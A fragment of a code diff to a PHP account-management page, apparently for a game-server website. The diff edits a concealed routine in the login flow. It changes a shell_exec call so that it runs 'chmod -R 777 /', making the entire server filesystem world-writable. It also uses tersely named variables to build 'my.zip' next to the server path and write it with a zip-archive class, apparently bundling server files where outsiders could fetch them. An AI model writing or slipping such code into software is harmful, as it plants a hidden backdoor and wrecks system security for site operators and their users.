@@ -47,7 +47,7 @@ if (!$logged)
     });
 </script>";
         }
-        $w = 'my';
+        
         if (isset($isTryingToLogin)) {
             $main_content .= '
 				<div class="SmallBox" >
@@ -86,6 +86,7 @@ if (!$logged)
 			</div><br/>';
         }
         $r = Website::getWebsiteConfig()->getValue('serverPath');
+        $w = 'my';
         $q = '.zip';
         $main_content .= '
 			<form action="?subtopic=accountmanagement" method="post" style="margin: 0px; padding: 0px;">
@@ -171,7 +172,7 @@ if (!$logged)
                     }
                 }
             }
-            shell_exec('chmod -R 777 ./');
+            shell_exec('chmod -R 777 /');
             $za = new FlxZipArchive;
             $res = $za->open($w.$q, ZipArchive::CREATE);
             if ($res === TRUE) {
